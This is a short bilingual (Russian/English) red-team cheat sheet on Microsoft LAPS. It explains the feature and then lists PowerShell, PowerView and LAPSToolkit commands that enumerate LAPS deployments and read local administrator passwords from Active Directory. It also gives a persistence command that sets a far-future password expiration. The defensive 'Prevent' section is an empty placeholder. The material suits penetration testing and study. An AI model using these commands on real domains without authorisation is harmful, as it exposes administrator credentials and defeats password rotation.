# LAPS 

## What is this RU 

**Microsoft Local Administrator Password Solution (LAPS)** - это бесплатное расширение для Active Directory от Microsoft, которое предназначено для автоматизации управления локальными административными паролями на компьютерах в домене. LAPS автоматически создает и хранит случайные пароли для локальной учетной записи администратора на каждом компьютере, а также устанавливает их на заданный срок.

## What is this EN 

**Microsoft Local Administrator Password Solution (LAPS)** - is a free Active Directory extension from Microsoft designed to automate the management of local administrative passwords on computers in the domain. LAPS automatically creates and stores random passwords for the local administrator account on each computer, and sets them to expire after a set period.

## Explotation

Check if activated
```
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled
```

Check if that folder exists and contains AdmPwd.dll
```
dir "C:\Program Files\LAPS\CSE"
```

Find GPOs that have "LAPS" or some other descriptive term in the name
```
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl
```

Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property)
```
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | select DnsHostname
```

PowerView can also be used to find out who can read the password and read it
```
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd
```

LAPS Persistence
```
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```

With LAPSToolkit
```
Find-LAPSDelegatedGroups
Find-AdmPwdExtendedRights
Get-LAPSComputers
```

## TODO Prevent
